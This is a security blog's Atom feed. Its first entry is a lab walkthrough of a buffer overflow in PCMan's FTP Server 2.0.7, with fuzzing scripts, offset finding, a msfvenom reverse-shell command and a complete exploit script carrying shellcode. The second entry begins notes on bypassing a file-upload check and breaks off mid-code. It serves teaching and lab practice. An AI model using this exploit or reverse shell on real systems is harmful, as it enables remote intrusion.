<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tao&#39;s blog</title>
  
  
  <link href="http://www.ywboy.cn/atom.xml" rel="self"/>
  
  <link href="http://www.ywboy.cn/"/>
  <updated>2020-11-16T06:53:19.211Z</updated>
  <id>http://www.ywboy.cn/</id>
  
  <author>
    <name>Bobtaoy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PCMan&#39;s FTP Server缓冲区溢出分析与利用</title>
    <link href="http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://www.ywboy.cn/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-11-16T06:43:43.000Z</published>
    <updated>2020-11-16T06:53:19.211Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PCMan’s-FTP-Server-缓冲区溢出漏洞利用"><a href="#PCMan’s-FTP-Server-缓冲区溢出漏洞利用" class="headerlink" title="PCMan’s FTP Server 缓冲区溢出漏洞利用"></a>PCMan’s FTP Server 缓冲区溢出漏洞利用</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><blockquote><p>WindowsXP-SP3（<code>PCMan’s FTP Server 2.0.7</code>， <code>Immunityinc debugger</code>, ）</p><p>攻击机：kali 2.0</p></blockquote><p>需要的基础：<code>对x86汇编语言有一定的了解</code>，<code>python基础</code>，常用调试工具的使用</p><h2 id="缓冲区溢出基础"><a href="#缓冲区溢出基础" class="headerlink" title="缓冲区溢出基础"></a>缓冲区溢出基础</h2><p>详情参考：<a href="http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/">缓冲区溢出原理分析(一)</a></p><p>​    简单的来说，如果我们输入的数据长度超过了开发人员定义的缓冲区，那么这个数据就可以覆盖掉关键的寄存器，如EIP，EIP是指令寄存器，它存放当前指令的下一条指令的地址。如果它被来自用户输入的垃圾数据覆盖了，程序通常会崩溃，因为它跳转到的地址并尝试指向，但执行的并不是有效的指令。我们的目的就是要定制一个数据发送到程序覆盖EIP，使程序跳转到我们控制的位置，这样我们就可以执行shellcode了</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/overflow.png" alt="img"></p><blockquote><p>图片来源：<a href="http://www.legendsec.org/2020.html">http://www.legendsec.org/2020.html</a></p></blockquote><h2 id="查找缓冲区溢出"><a href="#查找缓冲区溢出" class="headerlink" title="查找缓冲区溢出"></a>查找缓冲区溢出</h2><h3 id="模糊测试-Fuzzing"><a href="#模糊测试-Fuzzing" class="headerlink" title="模糊测试(Fuzzing)"></a>模糊测试(Fuzzing)</h3><p>因为我们要完成一次缓冲区溢出测试，因此我们现在就需要知道哪里会发生缓冲区溢出，这里我们就需要进行模糊测试(fuzzing),现在我们需要发送不同长度和内容的自定义字符串到我们要测试的输入点，如果程序崩溃,那么我们就使用调试工具调查一下为什么会崩溃，可不可以利用,这里我们以<code>PCMan’s FTP Server 2.0.7</code>为例子</p><p>首先我们来测试一下用户名这个输入点有没有存在问题。这里我们用Python编写了一个Fuzzer程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">100</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure><p>首先我们打开PCmanFTP运行程序：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105219299.png" alt="image-20201116105219299"></p><p>使用<code>./fuzzing.py 172.16.10.156 21</code>, 运行脚本，发现发送到大约2000的时候挂起了，检查我们的FTP服务器，可以发现已经崩溃。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105359862.png" alt="image-20201116105359862"></p><p>接下来我们就要来进一步研究一下，确认这错误是否可以利用，我们重新启动<code>PCmanFTP</code>程序</p><h3 id="崩溃调查"><a href="#崩溃调查" class="headerlink" title="崩溃调查"></a>崩溃调查</h3><p>打开<code>Immunityinc debugger</code>，然后<code>File-&gt;Attach</code> (首先要确保FTP程序已经在运行) </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105643048.png" alt="image-20201116105643048"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105741533.png" alt="image-20201116105741533"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105757588.png" alt="image-20201116105757588"></p><p>如上图所示，此时程序已经加载进来，是暂停状态， 我们使用快捷键<code>F9</code>让程序跑起来，也可以使用菜单栏的运行按钮</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105907120.png" alt="image-20201116105907120"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105943781.png" alt="image-20201116105943781"></p><p>当程序处于<code>Running</code>状态的时候，我们再一次运行<code>fuzzing.py</code>脚本。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116110423713.png" alt="image-20201116110423713"></p><p>此时我们程序崩溃，但是这里的<code>EIP</code>值并没有覆盖成我们想要<code>41414141</code>, 但是根据程序输出我们可知，发送字符达到<code>2000</code>时使得程序崩溃，这里我们猜测<code>2000</code>只是刚好导致了程序溢出很小，并没有覆盖返回地址，我们再一次测试，这次测试将步长修改为<code>150</code>, 代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">150</span><span class="comment"># modify this</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure><p>程序输出：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111221265.png" alt="image-20201116111221265"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111250442.png" alt="image-20201116111250442"></p><p>我们可以发现EIP寄存器的值是<code>41414141</code>，这意味着我们可以控制<code>EIP</code>，那么接下来我们要解决的问题就是哪里的A将EIP覆盖了呢？</p><h3 id="查找偏移数（Finding-the-offset）"><a href="#查找偏移数（Finding-the-offset）" class="headerlink" title="查找偏移数（Finding the offset）"></a>查找偏移数（Finding the offset）</h3><p>使用Metasploit的pattern_create工具创建一个500大小的字符串，</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111938456.png" alt="image-20201116111938456"></p><p> 因为我们通过上面的测试，大概判断溢出字符在<code>1900~2050</code>, 那么我们填写<code>&#39;A&#39; * 1900 + &quot;工具生成字符&quot; </code>构成payload发送至FTP服务端，如上操作，我们让程序在<code>Immunityinc debugger</code>中运行起来,然后执行如下程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: findoffset.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">1900</span> + <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span></span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116112858912.png" alt="image-20201116112858912"></p><p>可以发现，这一次EIP寄存器的值是<code>0x34644133</code>, 为了计算这个值偏移量，我们使用Metasploit中的另一个工具<code>pattern_offset</code>来确定字节数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pattern_offset.rb -l 500 -q 34644133</span><br><span class="line"><span class="comment"># -q参数为要查询的地址，-l参数为要查询的字符序列的长度</span></span><br><span class="line"><span class="comment"># 上图中我们得出的地址是 0x34644133, 而生成的字符串长度为500， 因此这里使用 -l 500 -q 34644133</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134108549.png" alt="image-20201116134108549"></p><p>计算结果为<code>101</code>, 也就是说覆盖返回地址是在<code>[2002-2005]</code> 这四个字节，我们来验证一下：</p><blockquote><p>注意，下图的1900 是我们上面findoffset.py这个程序pyload中的A字符数，而偏移量为201，那么最终覆盖EIP前的字符数就是1900+201=2001个字符</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134446739.png" alt="image-20201116134446739"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: overeip.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">2001</span> + <span class="string">&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135115486.png" alt="image-20201116135115486"></p><p>执行程序：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135306161.png" alt="image-20201116135306161"></p><p>查看windows xp，发现EIP（程序返回地址）被我们上面的4个B给覆盖了，到这一步，我们已经可以精确的覆盖EIP了</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135248117.png" alt="image-20201116135248117"></p><h2 id="寻找shellcode位置"><a href="#寻找shellcode位置" class="headerlink" title="寻找shellcode位置"></a>寻找shellcode位置</h2><p>我们在上面程序pyload后面加100个C，然后执行</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140101236.png" alt="image-20201116140101236"></p><p>可以看到，这里ESP指向的是我们在EIP后面给的<code>100个C</code>, 现在我们是要将C替换成我们希望运行的Shellcode。然后让EIP跳转到ESP寄存器的位置</p><h2 id="获得-EIP-to-jump"><a href="#获得-EIP-to-jump" class="headerlink" title="获得 EIP to jump"></a>获得 EIP to jump</h2><p>为什么我们不能告诉EIP去内存地址0x0012EDB8呢？因为这个地址在各个计算机上都不一样得，你不可能只想这个攻击只能攻击自己计算机吧。所以这里我们就要在程序的dll中找到具有JMP ESP命令的内存地址。这样我们就可以将EIP指向该位置，使其跳转到我们的缓冲区中。</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140431546.png" alt="image-20201116140431546"></p><p>我们这里使用<code>Immunityinc debugger</code> 在程序的dll中找到具有<code>JMP ESP</code>命令的内存地址</p><p>看看有哪些dll加载到了这个程序</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140845375.png" alt="image-20201116140845375"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140901583.png" alt="image-20201116140901583"></p><p>这里我们选择<code>kernel32.dll</code> 进行搜索， 搜索JMP ESP命令</p><p><code>右键-&gt; Search for -&gt; Command -&gt; 输出jmp esp 搜索</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141504015.png" alt="image-20201116141504015"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141557567.png" alt="image-20201116141557567"></p><p>这里返回的内存地址为<code>0x7C86467B</code>, 这个地址没有坏字符，我们可以来利用（坏字符是会破坏我们漏洞的字符，如<code>0x00</code>）,因为这里我们是小端显示，所以构造shellcode的时候需要倒过来写！</p><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.143 LPORT=1234 EXITFUNC=thread -f python -b <span class="string">&quot;\x00\x0a\x0d&quot;</span> -a x86</span><br><span class="line"><span class="comment"># 0x0A表示回车，0x0D表示换行，0x00表示字符串的结束， 这些都是坏字符，会破环我们的payload</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116142804801.png" alt="image-20201116142804801"></p><p>我们在最后跳转地址加入若干NOP字符，NOP代表跳过，意味着什么都不需要操作，并且指示CPI跳过此指令。有时候可以通过在shellcode前填充NOP增加漏洞利用程序和shellcode可靠性。这里我添加30个NOP，以提高可靠性。最终exp程序为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: exp.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\xd5\xbd\x8c\x36\xb0\x37\xd9\x74\x24\xf4\x58\x2b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x52\x31\x68\x17\x83\xe8\xfc\x03\xe4\x25\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc2\x08\xa1\x10\x2d\xf0\x32\x75\xa7\x15\x03\xb5\xd3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x5e\x34\x05\x97\x32\xb9\xee\xf5\xa6\x4a\x82\xd1\xc9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xfb\x29\x04\xe4\xfc\x02\x74\x67\x7f\x59\xa9\x47\xbe&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x92\xbc\x86\x87\xcf\x4d\xda\x50\x9b\xe0\xca\xd5\xd1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x38\x61\xa5\xf4\x38\x96\x7e\xf6\x69\x09\xf4\xa1\xa9&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa8\xd9\xd9\xe3\xb2\x3e\xe7\xba\x49\xf4\x93\x3c\x9b&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xc4\x5c\x92\xe2\xe8\xae\xea\x23\xce\x50\x99\x5d\x2c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xec\x9a\x9a\x4e\x2a\x2e\x38\xe8\xb9\x88\xe4\x08\x6d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4e\x6f\x06\xda\x04\x37\x0b\xdd\xc9\x4c\x37\x56\xec&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x82\xb1\x2c\xcb\x06\x99\xf7\x72\x1f\x47\x59\x8a\x7f&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x28\x06\x2e\xf4\xc5\x53\x43\x57\x82\x90\x6e\x67\x52&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xbf\xf9\x14\x60\x60\x52\xb2\xc8\xe9\x7c\x45\x2e\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x39\xd9\xd1\xeb\x39\xf0\x15\xbf\x69\x6a\xbf\xc0\xe1&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x6a\x40\x15\xa5\x3a\xee\xc6\x06\xea\x4e\xb7\xee\xe0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x40\xe8\x0f\x0b\x8b\x81\xba\xf6\x5c\x02\x2a\xf2\x13&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x32\x49\x02\x28\x11\xc4\xe4\x5a\x85\x81\xbf\xf2\x3c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x88\x4b\x62\xc0\x06\x36\xa4\x4a\xa5\xc7\x6b\xbb\xc0&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xdb\x1c\x4b\x9f\x81\x8b\x54\x35\xad\x50\xc6\xd2\x2d&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x1e\xfb\x4c\x7a\x77\xcd\x84\xee\x65\x74\x3f\x0c\x74&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe0\x78\x94\xa3\xd1\x87\x15\x21\x6d\xac\x05\xff\x6e&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xe8\x71\xaf\x38\xa6\x2f\x09\x93\x08\x99\xc3\x48\xc3&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x4d\x95\xa2\xd4\x0b\x9a\xee\xa2\xf3\x2b\x47\xf3\x0c&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x83\x0f\xf3\x75\xf9\xaf\xfc\xac\xb9\xd0\x1e\x64\xb4&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\x78\x87\xed\x75\xe5\x38\xd8\xba\x10\xbb\xe8\x42\xe7&quot;</span></span><br><span class="line">buf += <span class="string">&quot;\xa3\x99\x47\xa3\x63\x72\x3a\xbc\x01\x74\xe9\xbd\x03&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">2001</span> + <span class="string">&quot;\x7b\x46\x86\x7c&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">30</span> + buf</span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p>kali2.0 使用<code>nc -lp 1234</code> 监听1234端口，然后执行<code>./exp.py 172.16.10.156 21</code> </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143051811.png" alt="image-20201116143051811"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116143136212.png" alt="image-20201116143136212"></p><blockquote><p>参考文章：<a href="http://www.legendsec.org/2020.html%EF%BC%8C">http://www.legendsec.org/2020.html，</a> <a href="https://www.anquanke.com/post/id/84893">https://www.anquanke.com/post/id/84893</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PCMan’s-FTP-Server-缓冲区溢出漏洞利用&quot;&gt;&lt;a href=&quot;#PCMan’s-FTP-Server-缓冲区溢出漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;PCMan’s FTP Server 缓冲区溢出漏洞利用&quot;&gt;&lt;/a&gt;PC</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="溢出攻击" scheme="http://www.ywboy.cn/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs笔记</title>
    <link href="http://www.ywboy.cn/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.ywboy.cn/2020/11/03/upload-labs%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-03T14:54:50.000Z</published>
    <updated>2020-11-04T07:07:20.420Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><blockquote><p>说明：做题前先清空之前关卡上传的文件</p></blockquote><h2 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01 js检查"></a>Pass-01 js检查</h2><h3 id="1-分析"><a href="#1-分析" class="headerlink" title="1. 分析"></a>1. 分析</h3><p>首先我们先上传一张正常的图片，确定上传后文件保存的路劲</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103110837756.png" alt="image-20201103110837756"></p><blockquote><p>上传路劲为<code>../upload/</code>, 也就是<code>http://ip/upload/tao.jpg</code></p></blockquote><p>查看源代码，发现基于前端js的检查，只检查了文件上传的后缀，那么我们基于前端控制台，就该即可绕过</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103110631693.png" alt="image-20201103110631693"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pass-01</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span 